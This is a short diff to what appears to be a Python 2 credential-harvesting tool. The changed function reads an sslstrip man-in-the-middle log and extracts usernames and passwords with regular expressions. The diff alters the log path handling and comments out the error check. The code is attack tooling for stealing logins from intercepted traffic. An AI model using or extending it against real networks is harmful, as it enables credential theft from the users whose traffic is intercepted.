@@ -71,16 +71,18 @@ def credentials(users,passwords):
 user_regex = '([Ee]mail|[Uu]ser|[Uu]sr|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og|[Ll]ogin[Ii][Dd])=([^&|;]*)'
 pw_regex = '([Pp]assword|[Pp]ass|[Pp]wd|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|[Pp]asswrd|[Pp]assw)=([^&|;]*)'
 
-
 def credentials_harvest(file):
+	path = os.getcwd()
 	if file is None:
-		file = "sslstrip.log"
+		file = path + "/sslstrip.log"
+	else:
+		file = path + "/" + file
 	print "[$] Credential Harvester:"
-	try:
-		f = open(file,"r+")
-		content = f.read().replace('\n','')
-	except:
-		print "[!] Problem reading the sslstrip log"
+	#try:
+	f = open(file,"r+")
+	content = f.read().replace('\n','')
+	#except:
+		#print "[!] Problem reading the sslstrip log"
 	users = re.findall(user_regex, content)
 	passwords = re.findall(pw_regex, content)
 	credentials(users,passwords)
